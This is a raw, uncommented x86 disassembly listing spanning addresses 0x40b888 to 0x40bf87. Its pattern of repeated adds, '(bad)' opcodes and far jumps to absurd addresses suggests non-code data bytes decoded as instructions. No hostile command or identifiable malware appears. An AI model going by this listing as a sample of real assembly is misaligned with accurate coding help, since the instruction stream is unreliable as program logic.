  40b888:	jo     0x40b8fa
  40b88a:	jo     0x40b88c
  40b88c:	pop    esp
  40b88d:	pop    esp
  40b88e:	pop    esp
  40b88f:	add    BYTE PTR [ebp+0x4d],cl
  40b892:	dec    ebp
  40b893:	add    BYTE PTR [ecx],bh
  40b895:	cmp    DWORD PTR [ecx],edi
  40b897:	add    BYTE PTR [esi],ah
  40b899:	es add BYTE PTR es:[eax],al
  40b89d:	add    BYTE PTR [eax],al
  40b89f:	add    BYTE PTR [ecx],al
  40b8a1:	add    DWORD PTR [ecx],eax
  40b8a3:	add    DWORD PTR [ecx],eax
  40b8a5:	push   eax
  40b8a6:	cld    
  40b8a7:	sti    
  40b8a8:	add    DWORD PTR cs:[ecx],eax
  40b8ab:	add    DWORD PTR [ecx],eax
  40b8ad:	add    DWORD PTR [ecx],eax
  40b8af:	add    DWORD PTR [ecx],eax
  40b8b1:	add    DWORD PTR [ecx],eax
  40b8b3:	add    DWORD PTR [ecx],eax
  40b8b5:	add    DWORD PTR [ecx],eax
  40b8b7:	add    DWORD PTR [ecx],eax
  40b8b9:	add    DWORD PTR [ecx],eax
  40b8bb:	add    DWORD PTR [ecx],eax
  40b8bd:	add    DWORD PTR [ecx],eax
  40b8bf:	add    DWORD PTR [ecx],eax
  40b8c1:	add    DWORD PTR [ecx],eax
  40b8c3:	add    DWORD PTR [eax+0x4c],edx
  40b8c6:	sti    
  40b8c7:	push   ebp
  40b8c8:	inc    edx
  40b8c9:	inc    esi
  40b8ca:	push   ebp
  40b8cb:	sti    
  40b8cc:	cli    
  40b8cd:	add    DWORD PTR [ecx],eax
  40b8cf:	add    DWORD PTR [ecx],eax
  40b8d1:	add    DWORD PTR [edx+0x40],edx
  40b8d4:	xor    eax,0xfbfd4235
  40b8d9:	add    DWORD PTR [ecx],eax
  40b8db:	add    DWORD PTR [ecx],eax
  40b8dd:	add    DWORD PTR [ecx],eax
  40b8df:	add    DWORD PTR [ecx],eax
  40b8e1:	add    DWORD PTR [ecx],eax
  40b8e3:	push   edx
  40b8e4:	int    0x8f
  40b8e6:	or     al,0x58
  40b8e8:	idiv   al
  40b8ea:	push   edx
  40b8eb:	cld    
  40b8ec:	std    
  40b8ed:	inc    esi
  40b8ee:	(bad)  
  40b8ef:	cld    
  40b8f0:	cmp    ch,BYTE PTR [ebx]
  40b8f2:	cs sbb al,0x34
  40b8f5:	sub    ch,BYTE PTR ss:[ebx]
  40b8f8:	xor    eax,0x10152fe
  40b8fd:	add    DWORD PTR [ecx],eax
  40b8ff:	add    DWORD PTR [ecx],eax
  40b901:	add    eax,edi
  40b903:	fcomi  st,st(1)
  40b905:	jg     0x40b8c1
  40b907:	mov    edx,0x7f72baba
  40b90c:	mov    WORD PTR [esi+edx*4+0x2b],?
  40b910:	and    ebp,DWORD PTR ds:0x143c3832
  40b916:	inc    ebx
  40b917:	inc    ebp
  40b918:	cmp    eax,0x155462b
  40b91d:	add    DWORD PTR [ecx],eax
  40b91f:	add    DWORD PTR [ecx],eax
  40b921:	add    ebx,ebx
  40b923:	div    bh
  40b925:	js     0x40b8cf
  40b927:	test   al,0xa8
  40b929:	jb     0x40b981
  40b92b:	test   DWORD PTR [ebp+0x195e739d],ebx
  40b931:	sub    BYTE PTR [ebx+ebx*1],ch
  40b934:	aaa    
  40b935:	sbb    eax,0x78ec433c
  40b93a:	cs inc edx
  40b93c:	push   ebp
  40b93d:	add    DWORD PTR [ecx],eax
  40b93f:	add    DWORD PTR [ecx],eax
  40b941:	repz div edi
  40b944:	test   BYTE PTR [esi-0x3c3b4058],0xc1
  40b94b:	mov    ch,0xaf
  40b94d:	jns    0x40b966
  40b94f:	push   ss
  40b950:	and    DWORD PTR [ecx],ebx
  40b952:	es sub al,0x5b
  40b955:	aaa    
  40b956:	sbb    eax,0x4eec5614
  40b95b:	cs inc esi
  40b95d:	cli    
  40b95e:	add    DWORD PTR [ecx],eax
  40b960:	add    ebx,esi
  40b962:	fild   DWORD PTR [esi+esi*8]
  40b965:	xchg   BYTE PTR [eax-0x3a3a3a42],ch
  40b96b:	(bad)
  40b96e:	sbb    BYTE PTR [eax],ah
  40b970:	push   ds
  40b971:	and    DWORD PTR [ecx],ebx
  40b973:	es sub al,0x5b
  40b976:	pop    esp
  40b977:	inc    ebx
  40b978:	in     al,dx
  40b979:	in     al,dx
  40b97a:	in     al,dx
  40b97b:	dec    ecx
  40b97c:	sub    edi,esi
  40b97e:	add    DWORD PTR [ecx],eax
  40b980:	add    ebx,esi
  40b982:	mul    cl
  40b984:	jmp    0x40b914
  40b986:	test   DWORD PTR [esi-0x3a39383a],edi
  40b98c:	shl    BYTE PTR [eax+ebp*1],0x22
  40b990:	and    BYTE PTR [esi],bl
  40b992:	and    DWORD PTR [edx],esp
  40b994:	and    eax,0xec4d5b2c
  40b999:	in     al,dx
  40b99a:	in     al,dx
  40b99b:	in     al,dx
  40b99c:	adc    eax,0x101f935
  40b9a1:	repz cmc 
  40b9a3:	out    dx,al
  40b9a4:	fisttp WORD PTR [esi-0x37384269]
  40b9aa:	mov    ebp,0x252c1bb9
  40b9b0:	and    dl,BYTE PTR [esi]
  40b9b2:	push   ds
  40b9b3:	or     al,BYTE PTR [edi]
  40b9b5:	pop    es
  40b9b6:	adc    al,0xec
  40b9b8:	in     al,dx
  40b9b9:	in     al,dx
  40b9ba:	in     al,dx
  40b9bb:	in     al,dx
  40b9bc:	dec    esi
  40b9bd:	sub    edi,ebp
  40b9bf:	add    DWORD PTR [ecx],eax
  40b9c1:	repz cmc 
  40b9c3:	out    dx,al
  40b9c4:	ror    DWORD PTR [esi-0x36374261],1
  40b9ca:	mov    ebp,0x2c1b1374
  40b9d0:	and    eax,0x9051022
  40b9d5:	or     DWORD PTR ds:0x57ecec06,eax
  40b9db:	push   edi
  40b9dc:	push   edi
  40b9dd:	je     0x40ba25
  40b9df:	add    DWORD PTR ds:[ecx-0xc],ebx
  40b9e3:	mov    ebx,0xbd9f8e58
  40b9e8:	leave  
  40b9e9:	retf   0xc5c8
  40b9ec:	addr16 sbb eax,0x31281b5c
  40b9f2:	push   es
  40b9f3:	pcmpgtw mm4,QWORD PTR [ebp+0x64]
  40b9f7:	add    dl,BYTE PTR [ebx+0x77]
  40b9fa:	ja     0x40ba73
  40b9fc:	push   0x3d
  40b9fe:	inc    edx
  40b9ff:	ds add edx,esi
  40ba02:	repz mov ebx,0xbc9e8ee4
  40ba08:	retf   0xc9ca
  40ba0b:	retf   
  40ba0c:	ss sbb eax,0x381b5c37
  40ba12:	push   es
  40ba13:	sbb    cl,dh
  40ba15:	sahf   
  40ba16:	sub    DWORD PTR [esp+ecx*1],ecx
  40ba19:	xchg   BYTE PTR [esi+0x35417b86],al
  40ba1f:	ds add edx,esi
  40ba22:	pop    ecx
  40ba23:	in     eax,dx
  40ba24:	fimul  WORD PTR [ebp-0x33334359]
  40ba2a:	rcr    cl,cl
  40ba2c:	adc    DWORD PTR [edi],esi
  40ba2e:	aaa    
  40ba2f:	aaa    
  40ba30:	pop    esp
  40ba31:	cmp    eax,DWORD PTR [edx]
  40ba33:	xor    al,0xcd
  40ba35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba36:	adc    BYTE PTR gs:[edi+ebp*1],dl
  40ba3a:	pop    edi
  40ba3b:	pop    ebp
  40ba3c:	pusha  
  40ba3d:	outs   dx,BYTE PTR ds:[esi]
  40ba3e:	xor    eax,0xf2f1013e
  40ba43:	rcl    bl,1
  40ba45:	lea    esp,[esi-0x28282d4a]
  40ba4b:	(bad)  [eax]
  40ba4d:	pop    esp
  40ba4e:	pop    esp
  40ba4f:	pop    esp
  40ba50:	cmp    eax,DWORD PTR [ebx+0x6]
  40ba53:	add    eax,0xe126236
  40ba58:	xor    ah,BYTE PTR [edx]
  40ba5a:	es sub al,0x5c
  40ba5d:	xor    al,0x35
  40ba5f:	ds add ecx,esi
  40ba62:	in     eax,0xd4
  40ba64:	xchg   BYTE PTR [ebp-0x26267c63],cl
  40ba6a:	xlat   BYTE PTR ds:[ebx]
  40ba6b:	fld    DWORD PTR [eax]
  40ba6d:	push   0xec560e14
  40ba72:	add    eax,DWORD PTR ds:0x14050a07
  40ba78:	pop    ds
  40ba79:	and    BYTE PTR [ecx],bl
  40ba7b:	sbb    ebx,DWORD PTR es:[edx+0x55]
  40ba7f:	add    DWORD PTR [ecx],eax
  40ba81:	icebp  
  40ba82:	mov    bh,0xa2
  40ba84:	lods   eax,DWORD PTR ds:[esi]
  40ba85:	lea    ecx,[eax-0x27272476]
  40ba8b:	xlat   BYTE PTR ds:[ebx]
  40ba8c:	jmp    0xed2da6d2
  40ba91:	in     al,dx
  40ba92:	in     al,dx
  40ba93:	push   cs
  40ba94:	pop    es
  40ba95:	pop    es
  40ba96:	or     bl,BYTE PTR [ecx]
  40ba98:	push   ss
  40ba99:	push   ds
  40ba9a:	and    DWORD PTR [ecx],ebx
  40ba9c:	daa    
  40ba9d:	sub    cl,BYTE PTR [ecx+eax*1+0x1]
  40baa1:	in     eax,0xb5
  40baa3:	mov    al,ds:0x87948da4
  40baa8:	xchg   esp,eax
  40baa9:	xchg   esp,eax
  40baaa:	xchg   DWORD PTR [ecx-0x13f3d6dc],ecx
  40bab0:	in     al,dx
  40bab1:	in     al,dx
  40bab2:	in     al,dx
  40bab3:	inc    ebx
  40bab4:	xor    bl,BYTE PTR [ebx]
  40bab6:	sub    BYTE PTR ds:0x211e2022,ah
  40babc:	and    al,0x2b
  40babe:	add    DWORD PTR [ecx],eax
  40bac0:	add    ecx,esp
  40bac2:	mov    ch,0xa0
  40bac4:	cdq    
  40bac5:	lea    edx,[ebx-0x6c6c6c6d]
  40bacb:	xchg   ebx,eax
  40bacc:	xchg   ebx,eax
  40bacd:	pop    esi
  40bace:	adc    eax,0x56ececec
  40bad3:	cmp    al,0x38
  40bad5:	pop    esp
  40bad6:	sbb    ebp,DWORD PTR [eiz*1+0x23162022]
  40badd:	push   eax
  40bade:	add    DWORD PTR [ecx],eax
  40bae0:	add    ecx,esp
  40bae2:	mov    ch,0x90
  40bae4:	xchg   edx,eax
  40bae5:	lea    ebx,[edx-0x63636364]
  40baeb:	pushf  
  40baec:	fwait
  40baed:	xchg   ecx,eax
  40baee:	jne    0x40bb31
  40baf0:	in     al,dx
  40baf1:	in     al,dx
  40baf2:	jb     0x40bb08
  40baf4:	cmp    edi,DWORD PTR [eax]
  40baf6:	pop    esp
  40baf7:	sbb    ebp,DWORD PTR [eiz*1+0x13a5e19]
  40bafe:	add    DWORD PTR [ecx],eax
  40bb00:	add    ecx,esp
  40bb02:	xchg   ebp,eax
  40bb03:	jl     0x40baf5
  40bb05:	sahf   
  40bb06:	mov    ds:0x9898a398,eax
  40bb0b:	cwde   
  40bb0c:	cwde   
  40bb0d:	cwde   
  40bb0e:	cwde   
  40bb0f:	jne    0x40bb4e
  40bb11:	jmp    0x3738:0x3b144372
  40bb18:	xor    dh,BYTE PTR [ecx]
  40bb1a:	pop    esi
  40bb1b:	add    DWORD PTR cs:[ecx],eax
  40bb1e:	add    DWORD PTR [ecx],eax
  40bb20:	add    ecx,esp
  40bb22:	repnz fucomi st,st(0)
  40bb25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb26:	mov    eax,ds:0xabababa9
  40bb2b:	stos   DWORD PTR es:[edi],eax
  40bb2c:	stos   DWORD PTR es:[edi],eax
  40bb2d:	mov    eax,ds:0x3080a2a2
  40bb32:	or     ecx,DWORD PTR ds:0x393c1443
  40bb38:	xor    esi,DWORD PTR [eax]
  40bb3a:	add    DWORD PTR ds:[ecx],eax
  40bb3d:	add    DWORD PTR [ecx],eax
  40bb3f:	add    DWORD PTR [ecx],eax
  40bb41:	lock pop ecx
  40bb43:	fcmovnu st,st(2)
  40bb45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb46:	stos   DWORD PTR es:[edi],eax
  40bb47:	xchg   edi,eax
  40bb48:	ja     0x40bad7
  40bb4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb4b:	mov    bl,0xae
  40bb4d:	lods   eax,DWORD PTR ds:[esi]
  40bb4e:	stos   DWORD PTR es:[edi],eax
  40bb4f:	test   eax,0x7584aaa9
  40bb54:	imul   edx,DWORD PTR [ecx],0x30
  40bb57:	cs add DWORD PTR ds:[ecx],eax
  40bb5b:	add    DWORD PTR [ecx],eax
  40bb5d:	add    DWORD PTR [ecx],eax
  40bb5f:	add    DWORD PTR [ecx],eax
  40bb61:	lock loope 0x40bb52
  40bb64:	jecxz  0x40bb0d
  40bb66:	lahf   
  40bb67:	iret   
  40bb68:	(bad)  
  40bb6a:	out    0xe7,eax
  40bb6c:	loop   0x40bb29
  40bb6e:	mov    ?,WORD PTR [ebp-0x50]
  40bb71:	scas   eax,DWORD PTR es:[edi]
  40bb72:	mov    dl,0xac
  40bb74:	stos   BYTE PTR es:[edi],al
  40bb75:	stos   BYTE PTR es:[edi],al
  40bb76:	mov    eax,DWORD PTR [edx-0x3]
  40bb79:	cld    
  40bb7a:	add    DWORD PTR [ecx],eax
  40bb7c:	add    DWORD PTR [ecx],eax
  40bb7e:	add    DWORD PTR [ecx],eax
  40bb80:	add    eax,esi
  40bb82:	in     eax,dx
  40bb83:	in     al,dx
  40bb84:	rol    BYTE PTR [ecx+0x41],1
  40bb87:	inc    esp
  40bb88:	dec    ecx
  40bb89:	dec    esi
  40bb8a:	fisttp QWORD PTR [esp+edx*8]
  40bb8d:	aam    0xd5
  40bb8f:	rcl    esi,cl
  40bb91:	in     al,0xe6
  40bb93:	out    0xe1,al
  40bb95:	mov    dh,0xb4
  40bb97:	add    al,0xf8
  40bb99:	clc    
  40bb9a:	add    DWORD PTR [ecx],eax
  40bb9c:	add    DWORD PTR [ecx],eax
  40bb9e:	add    DWORD PTR [ecx],eax
  40bba0:	add    edi,ebp
  40bba2:	pop    eax
  40bba3:	out    dx,al
  40bba4:	in     eax,0x2a
  40bba6:	sub    ch,BYTE PTR cs:[edx]
  40bba9:	sub    DWORD PTR [ecx],edx
  40bbab:	ss inc ecx
  40bbad:	inc    esp
  40bbae:	jge    0x40bbf9
  40bbb0:	dec    ecx
  40bbb1:	out    dx,al
  40bbb2:	pop    eax
  40bbb3:	out    dx,eax
  40bbb4:	loope  0x40bb9b
  40bbb6:	loopne 0x40bbae
  40bbb8:	add    al,0x1
  40bbba:	add    DWORD PTR [ecx],eax
  40bbbc:	add    DWORD PTR [ecx],eax
  40bbbe:	add    DWORD PTR [ecx],eax
  40bbc0:	add    ebp,esi
  40bbc2:	pop    eax
  40bbc3:	(bad)  
  40bbc4:	mov    dh,0x75
  40bbc6:	gs sub ch,BYTE PTR gs:[ecx]
  40bbca:	sub    DWORD PTR [ecx],ebp
  40bbcc:	sub    DWORD PTR [eax],esi
  40bbce:	xor    BYTE PTR [esi+esi*1],bl
  40bbd1:	dec    edi
  40bbd2:	aad    0xd4
  40bbd4:	in     eax,dx
  40bbd5:	mov    ebx,0x101fccd
  40bbda:	add    DWORD PTR [ecx],eax
  40bbdc:	add    DWORD PTR [ecx],eax
  40bbde:	add    DWORD PTR [ecx],eax
  40bbe0:	add    ebx,ebx
  40bbe2:	aam    0xe2
  40bbe4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bbe5:	mov    ds:0x7c819491,eax
  40bbea:	jl     0x40bc5b
  40bbec:	data16 pop dx
  40bbef:	pop    edx
  40bbf0:	pop    edx
  40bbf1:	dec    edx
  40bbf2:	push   0xe
  40bbf4:	inc    edi
  40bbf5:	inc    edi
  40bbf6:	add    al,0xfe
  40bbf8:	add    DWORD PTR [ecx],eax
  40bbfa:	add    DWORD PTR [ecx],eax
  40bbfc:	add    DWORD PTR [ecx],eax
  40bbfe:	add    DWORD PTR [ecx],eax
  40bc00:	mov    eax,0x9b77e3d0
  40bc05:	xchg   ecx,eax
  40bc06:	xchg   esp,eax
  40bc07:	mov    BYTE PTR [eax+0x767e7e82],cl
  40bc0d:	jbe    0x40bc85
  40bc0f:	ins    BYTE PTR es:[edi],dx
  40bc10:	imul   esp,DWORD PTR [ecx+0x3c],0x4e47143c
  40bc17:	cld    
  40bc18:	sti    
  40bc19:	add    DWORD PTR [ecx],eax
  40bc1b:	add    DWORD PTR [ecx],eax
  40bc1d:	add    DWORD PTR [ecx],eax
  40bc1f:	add    DWORD PTR [eax-0x6e6c5889],edi
  40bc25:	xchg   esp,eax
  40bc26:	mov    BYTE PTR [eax+0x7e7e8282],cl
  40bc2c:	jbe    0x40bca4
  40bc2e:	jo     0x40bc98
  40bc30:	push   0x47433f15
  40bc35:	dec    ebp
  40bc36:	in     al,dx
  40bc37:	clc    
  40bc38:	inc    BYTE PTR [ecx]
  40bc3a:	add    DWORD PTR [ecx],eax
  40bc3c:	add    DWORD PTR [ecx],eax
  40bc3e:	add    DWORD PTR [ecx],eax
  40bc40:	mov    eax,0x9491a2b1
  40bc45:	mov    BYTE PTR [eax+0x767e7e82],cl
  40bc4b:	jbe    0x40bcbd
  40bc4d:	jo     0x40bcb7
  40bc4f:	arpl   WORD PTR [edi-0x5],bx
  40bc52:	dec    eax
  40bc53:	push   cs
  40bc54:	push   esi
  40bc55:	in     al,dx
  40bc56:	in     al,dx
  40bc57:	pop    eax
  40bc58:	stc    
  40bc59:	add    DWORD PTR [ecx],eax
  40bc5b:	add    DWORD PTR [ecx],eax
  40bc5d:	add    DWORD PTR [ecx],eax
  40bc5f:	add    DWORD PTR [ecx],eax
  40bc61:	mov    eax,0x8383b859
  40bc66:	and    DWORD PTR [esi+ebp*2+0x7a],0x7a
  40bc6b:	jno    0x40bcde
  40bc6d:	ins    DWORD PTR es:[edi],dx
  40bc6e:	push   0xf5f86463
  40bc73:	dec    esi
  40bc74:	in     eax,dx
  40bc75:	lock cmc 
  40bc77:	hlt    
  40bc78:	dec    ebx
  40bc79:	add    DWORD PTR [ecx],eax
  40bc7b:	add    DWORD PTR [ecx],eax
  40bc7d:	add    DWORD PTR [ecx],eax
  40bc7f:	add    DWORD PTR [ecx],eax
  40bc81:	add    DWORD PTR [ecx],eax
  40bc83:	add    DWORD PTR [ecx],eax
  40bc85:	add    DWORD PTR [ecx],eax
  40bc87:	add    DWORD PTR [ecx],eax
  40bc89:	add    DWORD PTR [ebx+0x4b],ecx
  40bc8c:	dec    ebx
  40bc8d:	dec    ebx
  40bc8e:	push   ecx
  40bc8f:	dec    ebx
  40bc90:	push   esp
  40bc91:	add    DWORD PTR [ecx],eax
  40bc93:	dec    ebx
  40bc94:	dec    ebx
  40bc95:	dec    ebx
  40bc96:	dec    ebx
  40bc97:	add    DWORD PTR [ecx],eax
  40bc99:	add    DWORD PTR [ecx],eax
  40bc9b:	add    DWORD PTR [ecx],eax
  40bc9d:	add    DWORD PTR [ecx],eax
  40bc9f:	add    eax,edi
  40bca1:	jg     0x40bca2
  40bca3:	push   eax
  40bca5:	pop    es
  40bca6:	sar    BYTE PTR [edi-0x20],0x0
  40bcaa:	add    BYTE PTR [edi],bl
  40bcac:	rol    BYTE PTR [eax],0x0
  40bcaf:	xadd   BYTE PTR [eax],al
  40bcb2:	add    BYTE PTR [edi],al
  40bcb4:	add    BYTE PTR [eax],0x0
  40bcb7:	add    eax,DWORD PTR [eax-0x7ffd0000]
  40bcbd:	add    BYTE PTR [eax],al
  40bcbf:	add    DWORD PTR [eax-0x7fff0000],eax
  40bcc5:	add    BYTE PTR [eax],al
  40bcc7:	add    BYTE PTR [eax-0x80000000],al
  40bccd:	add    BYTE PTR [eax],al
  40bccf:	add    BYTE PTR [eax-0x80000000],al
  40bcd5:	add    BYTE PTR [eax],al
  40bcd7:	add    BYTE PTR [eax-0x7fff0000],al
  40bcdd:	add    BYTE PTR [eax],al
  40bcdf:	add    DWORD PTR [eax-0x7ffd0000],eax
  40bce5:	add    BYTE PTR [eax],al
  40bce7:	add    eax,DWORD PTR [eax-0x7ff90000]
  40bced:	add    BYTE PTR [eax],al
  40bcef:	jo     0x805fbcf5
  40bcf5:	add    BYTE PTR [eax],al
  40bcf7:	jg     0x40bc79
  40bcf9:	add    BYTE PTR [eax],al
  40bcfb:	aas    
  40bcfc:	add    BYTE PTR [eax],0x0
  40bcff:	aas    
  40bd00:	add    BYTE PTR [eax],0x0
  40bd03:	jg     0x40bc85
  40bd05:	add    BYTE PTR [eax],al
  40bd07:	inc    DWORD PTR [eax+0xff0000]
  40bd0d:	add    BYTE PTR [eax],al
  40bd0f:	jg     0x40bd11
  40bd11:	add    BYTE PTR [eax],al
  40bd13:	jg     0x40bd15
  40bd15:	add    BYTE PTR [eax],al
  40bd17:	jg     0x40bc99
  40bd19:	add    BYTE PTR [eax],al
  40bd1b:	jg     0x40bd1c
  40bd1d:	shl    BYTE PTR [ecx-0x1],0x28
  40bd21:	add    BYTE PTR [eax],al
  40bd23:	add    BYTE PTR [eax],dl
  40bd25:	add    BYTE PTR [eax],al
  40bd27:	add    BYTE PTR [eax],ah
  40bd29:	add    BYTE PTR [eax],al
  40bd2b:	add    BYTE PTR [ecx],al
  40bd2d:	add    BYTE PTR [eax],cl
	...
  40bd47:	add    cl,ch
  40bd49:	call   0xa1e7be3e
  40bd4e:	ret    
  40bd4f:	add    ch,ch
  40bd51:	jmp    0x40be44
  40bd56:	add    BYTE PTR [eax],al
  40bd58:	push   ebx
  40bd5a:	inc    DWORD PTR [eax]
  40bd5c:	jmp    0x40bd42
  40bd5e:	jmp    0x7f00:0xdfd5e400
  40bd65:	jl     0x40bde5
  40bd67:	add    dl,dh
  40bd69:	mov    esi,0xa5c600dc
  40bd6e:	mov    eax,0xd0bbfc00
  40bd73:	add    dh,ah
  40bd75:	(bad)  
  40bd76:	rol    DWORD PTR [eax],1
  40bd78:	push   ebx
  40bd7a:	test   DWORD PTR [eax],0xd0ccd9
  40bd80:	push   edx
  40bd82:	test   BYTE PTR [eax],0xf1
  40bd85:	loopne 0x40bd6b
  40bd87:	add    ch,bh
  40bd89:	ror    ebx,0x0
  40bd8c:	dec    ebx
  40bd8e:	rol    BYTE PTR [eax],cl
  40bd90:	push   DWORD PTR [ecx-0x4800ff46]
  40bd96:	mov    ebp,0xaaa7cb00
  40bd9b:	add    bh,bh
  40bd9d:	popf   
  40bd9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd9f:	add    bh,bh
  40bda1:	leave  
  40bda2:	int3   
  40bda3:	add    bh,bh
  40bda5:	fcmovnu st,st(5)
  40bda7:	add    ah,ch
  40bda9:	fcmovu st,st(3)
  40bdab:	add    bh,dh
  40bdad:	test   eax,0xb3ff00ab
  40bdb2:	mov    ah,0x0
  40bdb4:	mov    ebp,0xff008786
  40bdb9:	leave  
  40bdba:	retf   0xc500
  40bdbd:	sahf   
  40bdbe:	lahf   
  40bdbf:	add    ch,ch
  40bdc1:	retf   
  40bdc2:	int3   
  40bdc3:	add    bh,bh
  40bdc5:	fstp   st(6)
  40bdc7:	add    bh,bh
  40bdc9:	lahf   
  40bdca:	sahf   
  40bdcb:	add    bh,bh
  40bdcd:	mov    al,ds:0xa1ff00a0
  40bdd2:	mov    al,ds:0x9f9ffc00
  40bdd7:	add    bh,bh
  40bdd9:	mov    ds:0xadff00a2,eax
  40bdde:	lods   al,BYTE PTR ds:[esi]
  40bddf:	add    BYTE PTR [edx-0xff8384],dh
  40bde5:	mov    bl,0xb3
  40bde7:	add    ah,bh
  40bde9:	mov    dh,0xb6
  40bdeb:	add    bh,bh
  40bded:	mov    esi,0x8dbb00bd
  40bdf2:	lea    eax,[eax]
  40bdf4:	and    BYTE PTR [ebx+0x63],0x0
  40bdf8:	pusha  
  40bdf9:	dec    ecx
  40bdfa:	dec    ecx
  40bdfb:	add    BYTE PTR [eax-0xff9697],cl
  40be01:	mov    dh,0x0
  40be04:	mov    bh,0x91
  40be06:	xchg   ecx,eax
  40be07:	add    BYTE PTR [ebp+0x4e007d7d],bl
  40be0d:	ds ds add bh,bh
  40be11:	into   
  40be12:	into   
  40be13:	add    ch,cl
  40be15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be17:	add    BYTE PTR [eax-0x4ff8b8c],dl
  40be1d:	retf   
  40be1e:	retf   
  40be1f:	add    BYTE PTR [edi+0x5a],ch
  40be22:	pop    edx
  40be23:	add    BYTE PTR [ebp+eiz*2+0x65],bh
  40be27:	add    BYTE PTR ds:0x3b003232,bh
  40be2d:	xor    DWORD PTR [ecx],esi
  40be2f:	add    bh,bh
  40be31:	(bad)  
  40be33:	add    bh,bh
  40be35:	jmp    0xc3:0xc3d500ea
  40be3c:	aam    0xc3
  40be3e:	ret    
  40be3f:	add    dh,bh
  40be41:	in     al,dx
  40be42:	in     al,dx
  40be43:	add    dh,bh
  40be45:	out    dx,al
  40be46:	out    dx,al
  40be47:	add    bh,bh
  40be49:	lock lock add ah,dl
  40be4d:	iret   
  40be4e:	iret   
  40be4f:	add    bh,bh
  40be51:	sti    
  40be52:	sti    
  40be53:	add    dh,ch
  40be55:	jmp    0xe9:0xe9ec00ea
  40be5c:	pop    esi
  40be5d:	pop    ebp
  40be5e:	pop    ebp
  40be5f:	add    bh,bh
  40be61:	(bad)  
  40be62:	inc    BYTE PTR [eax]
  40be64:	cli    
  40be65:	retf   
  40be66:	retf   0xc000
  40be69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be6b:	add    BYTE PTR [ebx-0xff7f7d],dh
  40be71:	iret   
  40be72:	int    0x0
  40be74:	(bad)  
  40be75:	mov    al,0xaf
  40be77:	add    cl,cl
  40be79:	scas   eax,DWORD PTR es:[edi]
  40be7a:	lods   eax,DWORD PTR ds:[esi]
  40be7b:	add    bl,bl
  40be7d:	int3   
  40be7e:	retf   
  40be7f:	add    dh,al
  40be81:	xchg   BYTE PTR [edi+0x0],bh
  40be84:	in     al,dx
  40be85:	(bad)  
  40be86:	rol    BYTE PTR [eax],0xe8
  40be89:	loop   0x40be6c
  40be8b:	add    bh,ah
  40be8d:	mov    al,0xa5
  40be8f:	add    bl,cl
  40be91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be92:	sahf   
  40be93:	add    BYTE PTR [ebp+0x38007480],dh
  40be99:	xor    al,0x33
  40be9b:	add    ah,ch
  40be9d:	in     al,0xe2
  40be9f:	add    bh,bh
  40bea1:	aam    0xc7
  40bea3:	add    bh,bh
  40bea5:	cmc    
  40bea6:	repnz add BYTE PTR [ecx+0x66],dh
  40beaa:	bound  eax,QWORD PTR [eax]
  40beac:	clc    
  40bead:	cmc    
  40beae:	hlt    
  40beaf:	add    ah,ch
  40beb1:	mov    bh,0xa3
  40beb3:	add    BYTE PTR [edx-0xff655d],bh
  40beb9:	sar    BYTE PTR [ebx-0x53411900],1
  40bebf:	add    bl,ah
  40bec1:	rol    bh,1
  40bec3:	add    al,bh
  40bec5:	hlt    
  40bec6:	repnz add BYTE PTR [esi-0x28ff5c5c],ah
  40becd:	aad    0xd4
  40becf:	add    dl,dh
  40bed1:	mov    ebp,0xa4d200a0
  40bed6:	xchg   DWORD PTR [eax],eax
  40bed8:	dec    esi
  40beda:	mov    cl,0x0
  40bedc:	enter  0x9dad,0x0
  40bee0:	fadd   st,st(4)
  40bee2:	mov    eax,0x98b6e200
  40bee7:	add    al,bh
  40bee9:	les    ebx,FWORD PTR [ebp-0x56310100]
  40beef:	add    ch,ch
  40bef1:	in     eax,0xdf
  40bef3:	add    dh,ch
  40bef5:	rcr    DWORD PTR [ebp-0x5e330200],0x0
  40befc:	aad    0x99
  40befe:	pop    ebp
  40beff:	add    dh,dh
  40bf01:	leave  
  40bf02:	fwait
  40bf03:	add    bh,bh
  40bf05:	shl    BYTE PTR [esi-0x502d0b00],cl
  40bf0b:	add    cl,ch
  40bf0d:	in     eax,0xe1
  40bf0f:	add    BYTE PTR [edx+0x41],al
  40bf12:	inc    eax
  40bf13:	add    ah,bh
  40bf15:	mov    dh,0x68
  40bf17:	add    ch,bh
  40bf19:	lds    ecx,FWORD PTR [ebx-0x71380500]
  40bf1f:	add    bl,ah
  40bf21:	mov    bh,0x88
  40bf23:	add    al,cl
  40bf25:	stos   BYTE PTR es:[edi],al
  40bf26:	mov    DWORD PTR [eax],eax
  40bf28:	cld    
  40bf29:	int    0x93
  40bf2b:	add    ch,bl
  40bf2d:	ret    0xa3
  40bf30:	div    DWORD PTR [eax-0x540dffb0]
  40bf36:	push   ecx
  40bf37:	add    bh,bh
  40bf39:	mov    ecx,0xc2ff005e
  40bf3e:	jbe    0x40bf40
  40bf40:	shl    BYTE PTR [edi-0x340bff93],cl
  40bf46:	xchg   esi,eax
  40bf47:	add    bh,bh
  40bf49:	shr    BYTE PTR [eax+0x0],0xfc
  40bf4d:	mov    edi,0xc4fa0068
  40bf52:	js     0x40bf54
  40bf54:	loopne 0x40bf07
  40bf56:	jo     0x40bf58
  40bf58:	loope  0x40bf13
  40bf5a:	add    BYTE PTR [eax],0xf6
  40bf5d:	fidiv  DWORD PTR [ebx+0x71c7ff00]
  40bf63:	add    bl,bh
  40bf65:	retf   
  40bf66:	add    BYTE PTR [eax],0xd8
  40bf69:	rol    esi,1
  40bf6b:	add    bl,dh
  40bf6d:	fdiv   QWORD PTR [ebx-0x4b2b1900]
  40bf73:	add    bl,dh
  40bf75:	loope  0x40bf35
  40bf77:	add    dh,ah
  40bf79:	loop   0x40bf54
  40bf7b:	add    cl,dh
  40bf7d:	in     eax,0xc9
  40bf7f:	add    cl,bh
  40bf81:	repz loope 0x40bf84
  40bf84:	lock jmp 0x40bf5a
  40bf87:	add    bh,bh
